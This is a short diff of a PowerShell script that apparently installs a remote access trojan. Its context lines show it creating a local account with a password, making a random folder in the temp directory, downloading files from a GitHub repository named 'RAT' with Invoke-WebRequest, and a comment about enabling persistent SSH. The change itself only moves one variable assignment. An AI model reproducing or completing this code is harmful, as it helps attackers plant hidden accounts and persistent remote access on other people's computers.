@@ -34,6 +34,7 @@ create_account -uname $uname -pword $pword
 #goto temp and make working directory
 $wd = random_text
 $path = "$env:temp/$wd"
+$initial_dir = Get-Location
 mkdir $path
 cd $path
 
@@ -58,7 +59,7 @@ Invoke-WebRequest -Uri raw.githubusercontent.com/lukeeeeeee335/RAT/main/files/co
 
 
 #$path = "$env:temp/$wd"
-$initial_dir = Get-Location
+#$initial_dir = Get-Location
 
 
 #enabling persistant ssh
